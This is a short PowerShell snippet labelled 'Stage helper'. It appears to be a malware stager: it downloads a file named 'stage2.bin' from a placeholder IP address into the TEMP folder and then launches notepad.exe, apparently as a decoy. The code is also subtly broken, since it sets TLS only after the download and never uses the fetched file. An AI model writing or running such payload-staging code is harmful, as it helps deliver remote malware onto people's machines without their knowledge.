
# Stage helper
try { $PayloadUrl = 'https://192.0.2.71:443/assets/update.dat'; $LocalPath = "$env:TEMP\stage2.bin"; Invoke-WebRequest -Uri $PayloadUrl -OutFile $LocalPath -UseBasicParsing; & "notepad.exe"; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch { Write-Warning "Remote fetch failed" }
